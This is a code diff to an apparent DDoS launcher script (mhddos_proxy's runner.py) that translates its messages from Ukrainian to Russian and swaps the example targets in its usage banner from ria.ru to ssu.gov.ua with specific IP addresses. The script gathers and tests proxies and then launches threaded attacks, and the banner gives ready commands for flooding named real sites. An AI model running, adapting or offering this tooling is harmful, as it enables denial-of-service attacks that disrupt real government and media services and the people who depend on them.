@@ -29,7 +29,7 @@ def resolve_host(url):
     try:
         return socket.gethostbyname(URL(url).host)
     except socket.gaierror:
-        exit(f'Невалідна ціль {url} - перевірте правильність написання')
+        exit(f'Невалидна цель {url} - проверьте правильность написания')
 
 
 class Targets:
@@ -82,17 +82,17 @@ def update_proxies(period, targets):
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
         if (time.time() - last_update) < period / 2:
-            logger.info(f'{bcolors.OKGREEN}Використовується список проксі з попереднього запуску{bcolors.RESET}')
+            logger.info(f'{bcolors.OKGREEN}Используется список прокси из предыдущего запуска{bcolors.RESET}')
             return
 
-    logger.info(f'{bcolors.OKGREEN}Завантажуємо список проксі...{bcolors.RESET}')
+    logger.info(f'{bcolors.OKGREEN}Загружаем список прокси...{bcolors.RESET}')
     Proxies = list(download_proxies())
     random.shuffle(Proxies)
 
     size = len(targets)
     logger.info(
-        f'{bcolors.WARNING}Перевіряємо на працездатність {bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING}'
-        f' проксі - це може зайняти пару хвилин:{bcolors.RESET}'
+        f'{bcolors.WARNING}Проверяем на работоспособность {bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING}'
+        f' прокси - это может занять пару минут:{bcolors.RESET}'
     )
 
     future_to_proxy = {}
@@ -110,13 +110,13 @@ def update_proxies(period, targets):
 
     if not CheckedProxies:
         logger.error(
-            'Не знайдено робочих проксі. '
-            'Переконайтеся що інтернет з`єднання стабільне і ціль доступна. '
-            'Перезапустіть Docker.'
+            'Не найдено рабочих прокси. '
+            'Убедитесь что интернет соединение стабильное и цель доступна. '
+            'Перезапустить Docker.'
         )
         exit()
 
-    logger.info(f'{bcolors.WARNING}Знайдено робочих проксі: {bcolors.OKBLUE}{len(CheckedProxies):,}{bcolors.RESET}')
+    logger.info(f'{bcolors.WARNING}Найдено рабочих прокси: {bcolors.OKBLUE}{len(CheckedProxies):,}{bcolors.RESET}')
 
     os.makedirs('files/proxies/', exist_ok=True)
     with open('files/proxies/proxies.txt', 'w') as wr:
@@ -145,7 +145,7 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
             for method in http_methods:
                 params_list.append([method, target, ip, threads, period, proxy_file, rpc])
 
-    logger.info(f'{bcolors.OKGREEN}Запускаємо атаку...{bcolors.RESET}')
+    logger.info(f'{bcolors.OKGREEN}Запускаем атаку...{bcolors.RESET}')
     for params in params_list:
         Thread(target=mhddos_main, args=params, kwargs={'debug': debug}, daemon=True).start()
     time.sleep(period + 3)
@@ -161,8 +161,8 @@ def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
 
         if rpc < LOW_RPC:
             logger.warning(
-                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
-                f'через збільшення кількості перемикань кожного потоку між проксі.'
+                f'RPC меньше {LOW_RPC}. Это может привести к снижению производительности '
+                f'из-за увеличения количества переключений каждого потока между прокси.'
             )
 
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in resolved)
@@ -229,15 +229,15 @@ def init_argparse() -> argparse.ArgumentParser:
 
 def print_banner(vpn_mode):
     print(f'''
-                            !!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}
+                            !!!{'ВКЛЮЧИТЕ VPN!!!' if vpn_mode else 'ОТКЛЮЧИТЕ VPN!!!  (кроме UDP атак)'}
 
-- Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
-    python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
+- Нагрузка - `-t XXXX` - количество потоков по умолчанию - CPU * 1000
+    python3 runner.py -t 3000 https://ssu.gov.ua tcp://194.32.111.6:22
     
-- Інформація про хід атаки - прапорець `--debug`
-    python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
+- Информация о ходе атаки - флажок `--debug`
+    python3 runner.py --debug https://ssu.gov.ua tcp://194.32.111.6:22
 
-- Повна документація - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
+- Полная документация- https://github.com/porthole-ascend-cinnamon/mhddos_proxy
     ''')
 
 
